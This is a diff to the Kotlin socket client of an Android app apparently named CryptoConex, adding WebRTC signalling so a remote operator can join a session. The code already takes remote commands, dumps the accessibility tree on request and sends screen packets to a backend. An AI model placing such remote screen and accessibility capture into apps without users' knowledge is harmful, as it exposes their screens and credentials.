@@ -7,17 +7,24 @@ import org.json.JSONObject
 import java.net.URI
 
 /**
- * Canal de comunicação com o backend via Socket.io.
+ * Canal de comunicação com o backend via Socket.io (sinalização WebRTC + comandos).
  * Reconexão automática com Exponential Backoff (nativo do cliente socket.io).
  */
 object SocketManager {
 
-    private const val BACKEND_URL = "https://conex-assist--9u92ii2p.preview.emergentagent.com"
+    private const val BACKEND_URL = "https://crypto-conex--6nq9iiht.preview.emergentagent.com"
     private var socket: Socket? = null
     var sessionId: String? = null
         private set
+    var iceServers: List<JSONObject> = emptyList()
+        private set
+
+    var onOperatorJoined: (() -> Unit)? = null
+    var onAnswer: ((String) -> Unit)? = null
+    var onRemoteIce: ((JSONObject) -> Unit)? = null
 
     fun connect(deviceId: String) {
+        if (socket != null) return
         val opts = IO.Options().apply {
             path = "/api/socketio"
             transports = arrayOf("websocket")
@@ -38,7 +45,10 @@ object SocketManager {
             socket?.emit("device:register", payload)
         }
         socket?.on("device:registered") { args ->
-            sessionId = (args[0] as JSONObject).optString("session_id")
+            val data = args[0] as JSONObject
+            sessionId = data.optString("session_id")
+            val arr = data.optJSONArray("iceServers") ?: JSONArray()
+            iceServers = (0 until arr.length()).map { arr.getJSONObject(it) }
         }
         socket?.on("command:receive") { args ->
             val cmd = (args[0] as JSONObject).optJSONObject("command") ?: return@on
@@ -47,7 +57,30 @@ object SocketManager {
         socket?.on("a11y:request") {
             sendAccessibilityTree(CryptoConexAccessibilityService.instance?.dumpTree() ?: JSONArray())
         }
+        socket?.on("operator:joined") { onOperatorJoined?.invoke() }
+        socket?.on("rtc:answer") { args ->
+            val sdp = (args[0] as JSONObject).optJSONObject("sdp")?.optString("sdp") ?: return@on
+            onAnswer?.invoke(sdp)
+        }
+        socket?.on("rtc:ice") { args ->
+            val c = (args[0] as JSONObject).optJSONObject("candidate") ?: return@on
+            onRemoteIce?.invoke(c)
+        }
         socket?.connect()
+    }
+
+    fun sendOffer(sdp: String) {
+        socket?.emit("rtc:offer", JSONObject().apply {
+            put("session_id", sessionId)
+            put("sdp", JSONObject().apply { put("type", "offer"); put("sdp", sdp) })
+        })
+    }
+
+    fun sendIce(candidate: JSONObject) {
+        socket?.emit("rtc:ice", JSONObject().apply {
+            put("session_id", sessionId)
+            put("candidate", candidate)
+        })
     }
 
     fun sendScreenPacket(packet: JSONObject) {
